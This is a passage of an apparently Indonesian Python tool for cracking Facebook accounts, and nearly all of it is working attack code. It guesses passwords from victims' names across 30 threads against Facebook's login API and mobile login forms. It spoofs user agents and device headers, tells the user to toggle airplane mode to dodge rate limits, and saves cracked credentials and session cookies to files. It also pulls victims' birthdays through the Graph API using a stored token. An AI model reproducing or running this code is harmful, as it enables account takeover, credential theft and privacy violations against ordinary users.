		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
	elif ask=="3":
		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, uid, pwx,"https://m.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
		
### BAGIAN CRACK ###
def api(uid, pwx):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice([
			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
		])
		headers = ({
			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
			'x-fb-sim-hni': str(random.randint(20000, 40000)),
			'x-fb-net-hni': str(random.randint(20000, 40000)),
			'x-fb-connection-quality': 'EXCELLENT',
			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'x-fb-http-engine': 'Liger'
		})
		params = {
			'format': 'JSON',
			'sdk_version': '2',
			'email': str(uid),
			'locale': 'en_US',
			'password': str(pw),
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
		file_jason = json.loads(status_masuk.text)
		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
			t=15
			while t:
				mins, secs = divmod(t, 60)
				sys.stdout.write("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
				sys.stdout.flush()
				sleep(1.5)
				t -= 1
		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
			break
		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mfbasic(uid, pwx,url,**data):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice([
			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
		])
		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
		sop=parser(ge,"html.parser")
		for i in sop.find_all("raw_input"):
			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
			else:data.update({i.get("name"):i.get("value")})
		data.update({"email":uid,"pass":pw})
		log_in=url+sop.find("form",method="post").get("action")
		if "m.facebook.com" in url:
			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		else:
			if "mbasic.facebook.com" in url:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
			else:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		po=s.post(log_in,data=data)
		if "c_user" in s.cookies.get_dict().keys():
			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, kukis))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in s.cookies.get_dict().keys():
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == '__main__':
	os.system("git pull")
	buatfolder()
	menu()
